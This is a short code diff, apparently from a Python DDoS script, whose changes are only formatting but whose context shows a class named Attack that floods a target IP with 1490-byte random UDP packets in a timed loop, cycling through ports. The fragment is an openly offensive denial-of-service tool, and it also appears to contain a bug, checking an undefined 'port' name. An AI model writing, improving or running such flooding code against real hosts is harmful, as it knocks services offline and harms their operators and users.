@@ -7,6 +7,7 @@ from socket import AF_INET, SOCK_DGRAM, socket
 
 class Attack:
     """Class for ddos attack"""
+
     sock = socket(AF_INET, SOCK_DGRAM)
     bytes = _urandom(1490)
 
@@ -18,7 +19,7 @@ class Attack:
     def attack(self):
         sent = 0
         while datetime.now() <= self.end_time:
-            self.sock.sendto(self.bytes, (self.ip,self.port))
+            self.sock.sendto(self.bytes, (self.ip, self.port))
             sent += 1
             self.port = self.port + 1
             if port == 65534:
